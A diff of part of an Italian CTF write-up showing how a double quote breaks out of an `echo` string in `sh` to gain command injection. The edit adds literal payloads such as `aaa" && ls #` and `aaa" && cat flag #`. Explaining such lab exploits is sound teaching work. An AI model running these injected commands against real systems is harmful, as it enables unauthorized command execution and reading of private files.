@@ -10,20 +10,21 @@ Infatti, è sufficiente scrivere delle ", per ricevere questo errore:
 
 che rivela che stiamo runnando in una shell (`sh`), e che adesso siamo fuori dalla stringa in cui dovremmo essere, permettendoci quindi di avere una `command injection`.
 
-Ci troviamo quindi in una situazione del genere:
+Con un input come `aaa"`, ci troviamo quindi in una situazione del genere (che darà l'errore di prima):
 
 ```sh
 echo "aaa""
 ```
 
-A questo punto basterà aggiungere i nostri comandi, e commentare l'ultima virgoletta per rendere la sintassi valida.
-Esempio:
+A questo punto basterà aggiungere i nostri comandi, e commentare l'ultima virgoletta per rendere la sintassi valida.  
+`aaa" && ls #`
 
 ```sh
 echo "aaa" && ls #"
 ```
 
-Ricavando i file presenti nella directory, e poi
+Ricavando i file presenti nella directory, e poi:  
+`aaa" && cat flag #`
 
 ```sh
 echo "aaa" && cat flag #"
